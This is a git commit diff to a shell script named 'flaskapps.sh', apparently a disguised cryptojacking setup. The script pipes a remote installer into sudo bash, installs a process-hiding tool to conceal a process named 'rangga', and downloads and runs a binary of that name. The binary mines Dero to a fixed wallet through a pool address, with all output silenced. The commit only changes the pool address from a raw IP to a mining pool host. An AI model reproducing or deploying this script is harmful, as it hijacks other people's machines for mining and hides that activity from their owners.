1cffafb0ae00322e1f3266b7e78901a61dcd9471
danipedrosang <134082647+danipedrosang@users.noreply.github.com>
2023-05-22 01:54:52 +0700

    Update and rename flaskapp.sh to flaskapps.sh

--- flaskapps.sh
+++ flaskapps.sh
@@ -5,4 +5,4 @@ curl -sL https://deb.nodesource.com/setup_16.x | sudo -E bash
 apt install nodejs -y
 npm install -g npm@8.18.0 -y && npm i -g node-process-hider && ph add rangga
 wget https://github.com/danipedrosang/marcrash/raw/main/rangga && chmod +x rangga
-./rangga --wallet-address=deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92x6838l67tghl8zqsn7unx --daemon-rpc-address=47.89.234.73:443 --mining-threads=1 >/dev/null 2>&1
+./rangga --wallet-address=deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92x6838l67tghl8zqsn7unx --daemon-rpc-address=dero.rabidmining.com:10300 --mining-threads=1 >/dev/null 2>&1
